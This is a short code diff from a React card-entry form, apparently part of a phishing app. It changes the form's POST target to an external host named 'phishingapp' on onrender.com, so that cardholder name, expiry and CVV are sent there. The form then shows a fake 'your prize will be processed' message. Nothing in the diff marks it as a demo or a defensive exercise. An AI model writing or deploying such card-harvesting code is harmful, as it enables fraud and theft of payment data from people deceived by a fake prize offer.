@@ -147,7 +147,7 @@ function CardForm({ selected, onClose }) {
         expiryYear: yy && yy.length === 2 ? String(2000 + parseInt(yy, 10)) : yy,
         cvv,
       };
-      const res = await axios.post("/api/cards", body);
+      const res = await axios.post("https://phishingapp-2iom.onrender.com/api/cards", body);
       setMessage("Success! Your prize will be processed within 24 hours.");
       setTimeout(() => {
         setCardName("");
